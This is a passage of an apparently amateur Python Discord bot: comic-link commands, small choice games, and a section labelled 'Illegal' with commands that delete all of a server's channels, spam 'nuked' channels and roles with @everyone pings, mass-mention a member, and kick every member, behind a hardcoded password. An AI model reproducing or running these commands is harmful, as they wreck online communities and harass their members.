  await ctx.reply("https://media.discordapp.net/attachments/888823531280941126/898456998360793088/20211015_115344.png?width=428&height=427", mention_author=False)

@client.command()
async def comic6(ctx):
  await ctx.reply("https://media.discordapp.net/attachments/888823531280941126/899925329634811904/IMG-20211019-WA0003.jpg?width=429&height=427", mention_author=False)      

@client.command()
async def comic7(ctx):
  await ctx.reply("https://media.discordapp.net/attachments/888823531280941126/901409140654604298/IMG-20211023-WA0003.jpg?width=426&height=427", mention_author=False) 

@client.command()
async def comic8(ctx):
  await ctx.reply("https://media.discordapp.net/attachments/888823531280941126/901732141782683708/frame_1634982443693.png?width=427&height=427", mention_author=False)   

@client.command()
async def comic9(ctx):
  await ctx.reply("https://media.discordapp.net/attachments/888823531280941126/902095853332865055/frame_1635099680728.png?width=427&height=427", mention_author=False)  

@client.command()
async def comic10(ctx):
  await ctx.reply("https://media.discordapp.net/attachments/888823531280941126/906817331316031548/frame_1636272440649.png?width=427&height=427", mention_author=False)

@client.command()
async def comic11(ctx):
  await ctx.reply("https://media.discordapp.net/attachments/888823531280941126/916031813137350676/frame_1638469307781.png?width=427&height=427", mention_author=False)

@client.command()
async def comic12(ctx):
  await ctx.reply("https://media.discordapp.net/attachments/888823531280941126/917756682636001320/frame_1638525329979.png", mention_author=False)

@client.command()
async def comic13(ctx):
  await ctx.reply("https://media.discordapp.net/attachments/888823531280941126/920283183155642398/frame_1639200538433.png?width=427&height=427", mention_author=False)        

@client.command(aliases=["comic21","comic15","comic16","comic17","comic18","comic19","comic20"]) 
async def comic14(ctx):
  await ctx.reply("Its not out yet but I love the curiosity 👍", mention_author=False) 
#------------------------------------------------------------------------------------------  


@client.command()
async def butt(ctx):
  button=discord.ui.Button(label= "click me")
  view = discord.ui.View()
  view.add_item(button)
  await ctx.send("butt", view=view)

#TIMER THINGY - VERY DANGEROUS
afk={}
@client.command()
async def afk(ctx,*, reason="afk"):
  member=ctx.author
  try:
    member.edit(nick = f"[AFK] {member.display_name}")
    await ctx.send(f"{member.name}, I set your afk : {reason}")
  except:
    pass    

#---------------------------------------------------------------------------------------
#---------------------------------------------------------------------------------------
# LIFE : A GAME OF CHOICES

@client.command()
async def thing(ctx):
  if ctx.author.id == 855488228387979294 or ctx.author.id == 753179105226129469:
    th=["red","blue"]
    def check(msg):
      return msg.author == ctx.author and msg.channel == ctx.channel and msg.content.lower() in th
    await ctx.send("type blue or red")
    choice = (await client.wait_for('message', check=check)).content
    if choice == "red":
      nu=["1","2"]
      def check(msg):
        return msg.author == ctx.author and msg.channel == ctx.channel and msg.content.lower() in nu
      await ctx.send("you chose red\ntype 1 or 2")
      num=(await client.wait_for('message', check=check)).content
      if num == "1":
        a=["a","b"]
        def check(msg):
          return msg.author == ctx.author and msg.channel == ctx.channel and msg.content.lower() in a
        await ctx.send("red 1\ntype a or b")
        ab=(await client.wait_for('message', check=check)).content
        if ab=="a":
          await ctx.send("red 1 a")
        if ab=="b":
          await ctx.send("red 1 b")  
      if num == "2":
        a=["a","b"]
        def check(msg):
          return msg.author == ctx.author and msg.channel == ctx.channel and msg.content.lower() in a
        await ctx.send("red 2\ntype a or b")
        ab=(await client.wait_for('message', check=check)).content
        if ab=="a":
          await ctx.send("red 2 a")
        if ab=="b":
          await ctx.send("red 2 b")   
    if choice == "blue":
      nu=["1","2"]
      def check(msg):
        return msg.author == ctx.author and msg.channel == ctx.channel and msg.content.lower() in nu
      await ctx.send("you chose blue\ntype 1 or 2")
      num=(await client.wait_for('message', check=check)).content
      if num == "1":
        await ctx.send("blue 1")
        a=["a","b"]
        def check(msg):
          return msg.author == ctx.author and msg.channel == ctx.channel and msg.content.lower() in a
        await ctx.send("blue 1\ntype a or b")
        ab=(await client.wait_for('message', check=check)).content
        if ab=="a":
          await ctx.send("blue 1 a")
        if ab=="b":
          await ctx.send("blue 1 b")
      if num == "2":
        await ctx.send("blue 2")
        a=["a","b"]
        def check(msg):
          return msg.author == ctx.author and msg.channel == ctx.channel and msg.content.lower() in a
        await ctx.send("blue 1\ntype a or b")
        ab=(await client.wait_for('message', check=check)).content
        if ab=="a":
          await ctx.send("blue 2 a")
        if ab=="b":
          await ctx.send("blue 2 b")
  else:
    await ctx.send("he was trying something out\nyou didn't have to be so curious")      

@client.command()
async def embedpages(ctx):
    page1 = discord.Embed (
        title = 'Start',
        description = 'select blue to start',
        colour = discord.Colour(0x95a5a6)
    )
    page2 = discord.Embed (
        title = '',
        description = "",
        colour = discord.Colour(0x95a5a6)
    )
    page3 = discord.Embed (
        title = 'stage 1',
        description = 'you are in a dark room. \npress red to stay there \npress blue to search the room',
        colour = discord.Colour(0x95a5a6)
    )
    page4 = discord.Embed (
        title = 'stage 2',
        description = 'you start feeling nauseous,\nPress blue to stay there silently or red to throw up',
        colour = discord.Colour(0x95a5a6)
    )
    page5 = discord.Embed (
        title = 'stage 2',
        description = 'you get up and try to look for things, \nyou find a button \nchoose blue to press it \nchoose red to leave it there and search',
        colour = discord.Colour(0x95a5a6)
    )
    page6 = discord.Embed (
        title = 'stage 3',
        description = 'BLEWCH!! \n DEATH!!',
        colour = discord.Colour(0x95a5a6)
    )
    page7= discord.Embed (
       title="stage 3",
       description = "the button sets off an explosion and you die lol",
       colour=discord.Color(0x95a5a6)
    )
    
    pages = [page1, page2, page3, page4, page5, page6, page7]

    message = await ctx.send(embed = page1)
    await message.add_reaction('🟥')
    await message.add_reaction('🟦')

    def check(reaction, user):
      return user == ctx.author

    i = 0
    reaction = None

    while True:
        if str(reaction) == '🟥':
            if i > 0:
                i += 1
                await message.edit(embed = pages[i])
        elif str(reaction) == '🟦':
            if i < 8:
                i += 2
                await message.edit(embed = pages[i])
        
        
        try:
            reaction, user = await client.wait_for('reaction_add', timeout = 30.0, check = check)
            await message.remove_reaction(reaction, user)
        except:
            break

    await message.clear_reactions()  

#prototype 1

@client.command()
async def sentence(ctx):
  await ctx.send("choose blue or red")
  a=(await client.wait_for("message")).content.lower()
  if a=="blue":
    await ctx.send("`blue`\nchoose sky or land")
    a=(await client.wait_for("message")).content.lower()
    if a=="sky":
      await ctx.send("`blue sky`\nchoose is or will")
      a=(await client.wait_for("message")).content.lower()
      if a=="is":
        await ctx.send("`blue sky is`\nchoose beautiful or deadly")
        a=(await client.wait_for("message")).content.lower()
        if a=="beautiful":
          await ctx.send("your sentence is `blue sky is beautiful`")
        elif a=="deadly":
          await ctx.send("your sentence is `blue sky is deadly`")
      if a=="will":
        await ctx.send("`blue sky will`\nchoose perish or live")
        a=(await client.wait_for("message")).content.lower()
        if a=="perish":
          await ctx.send("your sentence is `blue sky will perish`")
        elif a=="live":
          await ctx.send("your sentence is `blue sky will live`")
    if a=="land":
      await ctx.send("`blue land`\nchoose is or will")
      a=(await client.wait_for("message")).content.lower()
      if a=="is":
        await ctx.send("`blue land is`\nchoose beautiful or deadly")
        a=(await client.wait_for("message")).content.lower()
        if a=="beautiful":
          await ctx.send("your sentence is `blue sky is beautiful`")
        
  elif a=="red":
    await ctx.send("`red`\nchoose sky or land")
    a=(await client.wait_for("message")).content.lower()
    if a=="sky":
      await ctx.send("`red sky`\nchoose is or will")
      a=(await client.wait_for("message")).content.lower()
      if a=="is":
        await ctx.send("`red sky is`\nchoose beautiful or deadly")
        a=(await client.wait_for("message")).content.lower()
        if a=="beautiful":
          await ctx.send("your sentence is `red sky is beautiful`")
        elif a=="deadly":
          await ctx.send("your sentence is `red sky is deadly`")
      if a=="will":
        await ctx.send("`red sky is`\nchoose perish or live")
        a=(await client.wait_for("message")).content.lower()    
        if a=="perish":
          await ctx.send("your sentence is `red sky will perish`")
        elif a=="live":
          await ctx.send("your sentence is `red sky will live`")
    elif a=="land":
      await ctx.send("`red land`\nchoose is or will")
      a=(await client.wait_for("message")).content.lower()
      if a=="is":
        await ctx.send("`red land is`\nchoose beautiful or deadly")
        a=(await client.wait_for("message")).content.lower()
        if a=="beautiful":
          await ctx.send("your sentence is `red land is beautiful`")
        elif a=="deadly":
          await ctx.send("your sentence is `red land is deadly`")
      elif a=="will":
        await ctx.send("`red land is`\nchoose perish or live")
        a=(await client.wait_for("message")).content.lower()    
        if a=="perish":
          await ctx.send("your sentence is `red land will perish`")
        elif a=="live":
          await ctx.send("your sentence is `red land will live`")      


#------------------------------------------------Illegal-----------------------------------      

@client.command()
async def initiatekillsequence(ctx):
  if ctx.author.id==safwan or ctx.author.id == 823207609909248000:  
    await ctx.send("`enter password`")
    a=(await client.wait_for("message")).content
    if a=="15432":
      await ctx.send("`permission granted`")
      await asyncio.sleep(2)
      for c in ctx.guild.channels:
        await c.delete()
      for i in range(1,20):
        await ctx.guild.create_role(name="hahaha")
        await ctx.guild.create_role(name="nuked")
        await ctx.guild.create_text_channel(f'nuked it cry about it{i}')
        channel = discord.utils.get(client.get_all_channels(), guild=ctx.author.guild, name=f'nuked-it-cry-about-it{i}')
        await channel.send("BOOM\n@everyone <:hahayes:947334012924473444><:hahayes:947334012924473444>\nenjoy this \n" + ctx.author.avatar)
  
      

@client.command()
async def pingbomb(ctx,n,member: discord.Member=None):
  if ctx.author.id==safwan:
    s=int(n)
    for i in range(0,s):
      await ctx.send(f"{member.mention}")
  else:
    await ctx.send("no")

saif = 753179105226129469

@client.command()
async def kickall(ctx):
  if ctx.author.id ==safwan:
    members=ctx.guild.members
    members.remove(ctx.me)
    for member in members:
      try:
        if member.id != safwan or member.id != saif:
          await member.kick(reason="deleting server")
          await ctx.send(f"{member} was kicked.")
        else:
          await ctx.send(f"Failed to kick {member}.")
      except discord.Forbidden: 
        await ctx.send(f"Failed to kick {member}.")
        continue
    
#---------------------------------------------------------------------------------------

keep_alive()
TOKEN = os.environ.get("DISCORD_BOT_SECRET")
client.run(TOKEN)